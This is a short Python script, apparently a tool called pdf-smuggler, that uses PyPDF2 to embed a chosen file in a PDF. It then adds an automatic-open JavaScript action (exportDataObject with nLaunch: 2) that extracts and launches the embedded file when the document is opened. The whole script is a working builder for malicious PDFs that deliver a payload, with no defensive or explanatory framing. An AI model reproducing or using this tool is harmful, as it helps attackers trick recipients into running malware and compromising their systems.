#pip uninstall PyPDF2
#pip install PyPDF2==1.26.0

import sys
from PyPDF2 import PdfFileReader, PdfFileWriter
from PyPDF2.generic import NameObject, DictionaryObject, createStringObject

def add_attachment_to_pdf(inputpdf, file, outputpdf):
    if not inputpdf or not file or not outputpdf:
        raise ValueError("All parameters (inputpdf, file, outputpdf) are required.")

    # Open and read the input PDF
    with open(inputpdf, "rb") as f:
        reader = PdfFileReader(f)
        writer = PdfFileWriter()

        # Copy all pages to the writer
        for page_num in range(reader.getNumPages()):
            writer.addPage(reader.getPage(page_num))

        # Embed the file as an attachment
        with open(file, "rb") as attachment:
            writer.addAttachment(file, attachment.read())

        # Add JavaScript to launch the attachment
        js = 'this.exportDataObject({ cName: "%s", nLaunch: 2 });' % file
        js_action = DictionaryObject()
        js_action.update({
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): createStringObject(js),
        })

        writer._root_object.update({
            NameObject("/OpenAction"): js_action
        })

        # Write the modified PDF to output
        with open(outputpdf, "wb") as out_pdf:
            writer.write(out_pdf)

    print(f"✅ PDF created: {outputpdf} (embedded file: {file})")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: pdf-smuggler.py input.pdf file_to_embed output.pdf")
    else:
        add_attachment_to_pdf(sys.argv[1], sys.argv[2], sys.argv[3])
